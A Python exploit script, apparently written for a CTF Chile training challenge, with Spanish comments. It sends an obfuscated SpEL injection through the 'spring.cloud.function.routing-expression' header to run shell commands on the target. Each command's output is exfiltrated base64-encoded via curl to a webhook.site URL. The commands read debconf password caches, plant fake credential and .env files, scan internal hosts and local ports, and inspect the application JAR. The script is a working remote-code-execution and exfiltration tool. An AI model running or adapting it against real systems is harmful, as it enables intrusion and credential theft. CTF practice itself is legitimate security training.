#!/usr/bin/env python3
"""
CTF Chile - Investigar acceso de escritura y archivos recientes
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Investigando acceso de escritura y archivos recientes...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:40} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Examinar archivos recientes encontrados...")

# Examinar los archivos recientes que encontramos
recent_files = ["/tmp/loot1", "/tmp/marker1", "/tmp/test.txt", "/tmp/out.txt", "/tmp/lsout"]

for file_path in recent_files:
    file_safe = file_path.replace("/", "_")
    probe(f"examine{file_safe}", f"cat {file_path} 2>/dev/null || echo 'CANNOT_READ_{file_path}'")

print("[*] FASE 2: Examinar archivos de cache de debconf...")

# Revisar los archivos de configuración de debconf
cache_files = ["/var/cache/debconf/passwords.dat", "/var/cache/debconf/config.dat"]

for cache_file in cache_files:
    cache_safe = cache_file.replace("/", "_").replace(".", "_")
    probe(f"cache{cache_safe}", f"cat {cache_file} 2>/dev/null | head -10")

print("[*] FASE 3: Intentar crear archivos de configuración...")

# Ya que tenemos acceso de escritura a /app, intentar crear archivos de configuración
probe("create_config_app", "echo 'api.key=QED' > /app/application.properties && echo 'CONFIG_CREATED' && ls -la /app/")
probe("create_auth_file", "echo 'monitorRole=QED' > /app/auth.properties && echo 'AUTH_FILE_CREATED' && cat /app/auth.properties")

print("[*] FASE 4: Intentar modificar el entorno de la aplicación...")

# Intentar crear archivos que podrían ser leídos por las aplicaciones internas
probe("create_env_file", "echo 'API_TOKEN=QED' > /app/.env && echo 'ENV_FILE_CREATED' && cat /app/.env")
probe("create_secrets", "mkdir -p /app/secrets && echo 'controlRole:R&D' > /app/secrets/vault.txt && echo 'SECRETS_CREATED' && cat /app/secrets/vault.txt")

print("[*] FASE 5: Probar si podemos influir en las aplicaciones internas...")

# Después de crear archivos de configuración, probar las APIs nuevamente
hosts = ["10.160.209.1", "10.109.220.1"]

for host in hosts:
    host_safe = host.replace(".", "_")

    # Probar endpoints después de crear archivos de configuración
    probe(f"retry_execute_{host_safe}", f"curl -s -I http://{host}:8000/execute 2>/dev/null | head -3")
    probe(f"retry_openapi_{host_safe}", f"curl -s http://{host}:8000/openapi.json 2>/dev/null | head -5")

print("[*] FASE 6: Buscar conexiones de servicio específicas...")

# Buscar si hay servicios escuchando localmente que no habíamos detectado
probe("local_services", "netstat -tlnp 2>/dev/null | grep '127.0.0.1\\|localhost' | head -10")
probe("all_listening", "ss -tlnp 2>/dev/null | grep LISTEN | head -15")

print("[*] FASE 7: Intentar ingeniería reversa del JAR...")

# Intentar extraer información más específica del JAR
probe("jar_manifest", "unzip -p /app/app.jar META-INF/MANIFEST.MF 2>/dev/null")
probe("jar_spring_config", "unzip -l /app/app.jar 2>/dev/null | grep -E '(application|bootstrap|config)\\.(properties|yml|yaml)$'")

print("[*] FASE 8: Verificar si hay APIs REST en puertos locales...")

# Probar puertos locales que podrían tener APIs
local_ports = [8080, 9090, 8081, 3000, 5000]

for port in local_ports:
    probe(f"local_api_{port}", f"curl -s -I http://localhost:{port}/ 2>/dev/null | head -3")
    probe(f"local_api_{port}_execute", f"curl -s http://localhost:{port}/execute 2>/dev/null")

print("[*] FASE 9: Intentar bypass usando archivos de configuración...")

# Con los archivos de configuración creados, probar diferentes métodos de autenticación
for host in hosts:
    host_safe = host.replace(".", "_")

    # Probar con headers que referencien nuestros archivos creados
    probe(f"config_bypass_{host_safe}", f"curl -s -H 'X-Config-File: /app/application.properties' -H 'X-Auth-File: /app/auth.properties' http://{host}:8000/execute 2>/dev/null")

time.sleep(20)

# Recoger y analizar respuestas
print("\n[*] Analizando investigación de acceso de escritura...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=45", timeout=20)
data = r.json().get("data", [])

file_contents = []
config_successes = []
new_services = []
api_discoveries = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar contenidos de archivos interesantes
            if any(keyword in path for keyword in ["examine", "cache"]):
                if len(decoded.strip()) > 10 and "CANNOT_READ" not in decoded:
                    file_contents.append((path, decoded))
                    print("📄 CONTENIDO DE ARCHIVO")

            # Detectar éxito en creación de configuraciones
            if any(keyword in decoded for keyword in ["CREATED", "CONFIG_CREATED", "AUTH_FILE_CREATED"]):
                config_successes.append((path, decoded))
                print("✅ CONFIGURACIÓN CREADA EXITOSAMENTE")

            # Detectar nuevos servicios
            if any(keyword in decoded.lower() for keyword in ["listening", "listen", "bind"]):
                new_services.append((path, decoded))
                print("🔍 SERVICIO DETECTADO")

            # Detectar cambios en respuestas de API
            if "retry" in path and not any(keyword in decoded for keyword in ["403", "404", "Forbidden"]):
                if len(decoded.strip()) > 20:
                    api_discoveries.append((path, decoded))
                    print("🔌 CAMBIO EN RESPUESTA DE API")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DE INVESTIGACIÓN DE ACCESO DE ESCRITURA")
print("="*70)

if file_contents:
    print(f"📄 CONTENIDOS DE ARCHIVOS: {len(file_contents)}")
    for path, content in file_contents:
        print(f"    🎯 {path}")
        print(f"       {content[:150]}...")

if config_successes:
    print(f"\n✅ CONFIGURACIONES CREADAS: {len(config_successes)}")
    for path, content in config_successes:
        print(f"    🎯 {path}")
        print(f"       {content[:150]}...")

if new_services:
    print(f"\n🔍 SERVICIOS DETECTADOS: {len(new_services)}")
    for path, content in new_services:
        print(f"    - {path}: {content[:100]}...")

if api_discoveries:
    print(f"\n🔌 CAMBIOS EN APIs: {len(api_discoveries)}")
    for path, content in api_discoveries:
        print(f"    🎯 {path}")
        print(f"       {content[:150]}...")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    🎯 {path}: {flag}")

if not any([file_contents, config_successes, api_discoveries, flags_found]):
    print("💭 La investigación de acceso de escritura no reveló nuevas vías de ataque.")
    print("🤔 El método de autenticación puede requerir un enfoque completamente diferente.")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")

print(f"\n🎯 SIGUIENTE ESTRATEGIA:")
print(f"   1. Analizar contenidos de archivos temporales encontrados")
print(f"   2. Buscar patrones de autenticación no convencionales")
print(f"   3. Considerar que la autenticación puede requerir un flujo específico")
print(f"   4. Explorar si hay servicios adicionales que no hemos descubierto")